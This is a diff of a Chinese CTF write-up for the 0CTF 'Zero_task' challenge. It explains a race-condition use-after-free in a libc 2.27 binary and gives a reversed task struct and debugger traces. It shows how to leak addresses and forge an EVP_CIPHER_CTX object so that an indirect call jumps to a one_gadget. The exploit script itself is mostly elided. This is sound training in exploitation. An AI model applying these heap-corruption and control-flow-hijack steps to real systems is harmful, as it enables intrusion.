@@ -1,6 +1,38 @@
 # Zero_task
 
-漏洞为条件竞争,go的时候线程sleep了2秒
+0ctf的题都好难，大佬们tql
+
+漏洞为条件竞争,libc版本为2.27，存在tcache,go的时候线程sleep了2秒,我们可以提前释放一个task2结构，然后在task1 go的时候，把task1删除，然后task1的data成员会被覆盖成task2的地址,然后只要task1的data_sz足够大，就能把task2的内容全部都加密输出，后面用一次go的机会解密输出就能泄露地址。要注意的是删除task1的时候，task1的EVP_CIPHER_CTX 对象（对象大小为0xb0）会被破化，这样会导致加密异常，所以要想办法克服这个问题。
+参考大佬的方法：
+
+free(1)
+free(2)
+free(3)
+ad(0xa0)
+ad(0x8)
+
+这样最后一个ad(0x8)会把task1的EVP_CIPHER_CTX 对象重写，task1就能正常输出了。
+
+我分析的结构如下：
+
+```c
+task            struc ; (sizeof=0x80, mappedto_6)
+00000000 data            dq ?
+00000008 data_sz         dq ?
+00000010 enc_dec_flag    dd ?
+00000014 key             db 32 dup(?)
+00000034 IV              db 16 dup(?)
+00000044 field_44        dq ?
+0000004C field_4C        dq ?
+00000054 field_54        dd ?
+00000058 EVP_CTX_new_PTR dq ?
+00000060 task_id         dq ?
+00000068 next            dq ?
+00000070 field_70        dd ?
+00000074 field_74        dq ?
+0000007C field_7C        dd ?
+00000080 task            ends
+```
 
 ```c
 void __fastcall __noreturn start_routine(task *a1)
@@ -35,6 +67,49 @@ void __fastcall __noreturn start_routine(task *a1)
   pthread_exit(0LL);
 }
 ```
+泄露了地址后，还剩一次go的机会，跟进EVP_CipherUpdate函数，该函数会根据EVP_CIPHER_CTX 对象+0x10数据判断加密还是解密，加密流程里会有一处相对调用
+
+```c
+ 0x55f605048c10                           jmp    qword ptr [rip + 0x201342] <0x7ff7b8383d90>
+    ↓
+   0x7ff7b8383d90 <EVP_CipherUpdate>        mov    eax, dword ptr [rdi + 0x10]  
+   0x7ff7b8383d93 <EVP_CipherUpdate+3>      test   eax, eax
+ ► 0x7ff7b8383d95 <EVP_CipherUpdate+5>    ✔ jne    EVP_CipherUpdate+16 <0x7ff7b8383da0>
+    ↓
+   0x7ff7b8383da0 <EVP_CipherUpdate+16>     jmp    EVP_EncryptUpdate <0x7ff7b8383880>
+    ↓
+   0x7ff7b8383880 <EVP_EncryptUpdate>       push   r15
+   0x7ff7b8383882 <EVP_EncryptUpdate+2>     push   r14
+   0x7ff7b8383884 <EVP_EncryptUpdate+4>     push   r13
+   0x7ff7b8383886 <EVP_EncryptUpdate+6>     push   r12
+   0x7ff7b8383888 <EVP_EncryptUpdate+8>     mov    r13, rsi
+   0x7ff7b838388b <EVP_EncryptUpdate+11>    push   rbp
+
+```
+
+```c
+   0x7ff7b838389d <EVP_EncryptUpdate+29>     test   byte ptr [rax + 0x12], 0x10
+ ► 0x7ff7b83838a1 <EVP_EncryptUpdate+33>   ✔ je     EVP_EncryptUpdate+104 <0x7ff7b83838e8>
+    ↓
+   0x7ff7b83838e8 <EVP_EncryptUpdate+104>    cmp    r8d, 0
+   0x7ff7b83838ec <EVP_EncryptUpdate+108>    jle    EVP_EncryptUpdate+400 <0x7ff7b8383a10>
+ 
+   0x7ff7b83838f2 <EVP_EncryptUpdate+114>    movsxd r14, dword ptr [rdi + 0x14]
+   0x7ff7b83838f6 <EVP_EncryptUpdate+118>    test   r14d, r14d
+   0x7ff7b83838f9 <EVP_EncryptUpdate+121>    je     EVP_EncryptUpdate+352 <0x7ff
+   
+   ................................................................................
+  
+   0x7ff7b83839ed <EVP_EncryptUpdate+365>    movsxd rcx, r8d
+   0x7ff7b83839f0 <EVP_EncryptUpdate+368>    mov    dword ptr [rsp], r8d
+   0x7ff7b83839f4 <EVP_EncryptUpdate+372>    mov    rdx, r12
+ ► 0x7ff7b83839f7 <EVP_EncryptUpdate+375>    call   qword ptr [rax + 0x20]  
+
+
+```
+call   qword ptr [rax + 0x20] 这里的rax的值为EVP_CIPHER_CTX 对象的+00处的值，所以我们只要构造好假的对象，即可让程序跳转到one_gadget
+
+exp如下:
 
 ```python
 from pwn import *
@@ -146,4 +221,4 @@ if __name__ == "__main__":
 	main()
 ```
 
-参考链接: [](https://www.anquanke.com/post/id/175401)
+[https://www.anquanke.com/post/id/175401](https://www.anquanke.com/post/id/175401)
